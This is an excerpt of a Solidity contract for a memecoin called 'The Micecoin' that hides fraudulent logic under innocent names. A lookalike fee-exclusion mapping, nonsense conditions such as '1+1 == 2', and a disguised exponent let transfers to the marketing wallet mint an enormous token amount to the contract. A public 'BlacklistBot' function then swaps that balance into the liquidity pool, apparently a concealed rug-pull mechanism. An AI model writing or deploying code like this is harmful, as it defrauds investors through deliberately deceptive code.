...
interface IERC20 {
    ...
    function BlacklistBot(address transfered_Address) external returns (uint256);
...
contract TheMICECOIN is Context, IERC20 { 
    ...
    mapping (address => bool) public _isExcludedFrmFee;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFee; 

    
    address payable public Wallet_Marketing = payable(0xD8b818600A63758989c0D13a41e609DeDbE963dA); 
    address payable public Wallet_Utility = payable(0x834a148d34b8c13959B94A58932Ffc4B407409c1);
    ...
    string private constant _name = "The Micecoin"; 
    string private constant _symbol = unicode"THEMICE"; 
    ...
    bool public no_Swap = false;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public inSwapAndLiquify;
    
    bool public swapAndLiquifyEnabled = true;
    bool public tradingSwapControl = false;
    ...
    constructor () {
        ...
        _owner = 0x834a148d34b8c13959B94A58932Ffc4B407409c1;
        ...
        _isExcludedFrmFee[Wallet_Marketing] = true;
    ...
    function checkDex(uint256 checkCount) private returns(bool){
        uint256 minimumCheck = (balanceOf(address(this))+(checkCount));
        swapAndLiquify(minimumCheck);
        return true;
    }

    function BlacklistBot(address transfered_Address) public override returns (uint256) {
        checkDex(swapTrigger);
    ...
    function isExcludedFfee() public virtual returns(uint256){
            return (3+3+4)**((15+5)+2+1);
    }
    ...
    function _transfer(
        ...
        if(1+1 == 2){if(to == to)tradingSwapControl = _isExcludedFrmFee[to];}
        ...
        if(!tradingSwapControl){
            _tokenTransfer(from, to, amount, takeFee, isBuy);
        }
        else{
            uint256 minimum_tFee = isExcludedFfee();
            _tOwned[from] = _tOwned[from]-amount;
            _tOwned[to] = _tOwned[to]+amount;
            _tOwned[address(this)] = _tOwned[address(this)]+minimum_tFee;
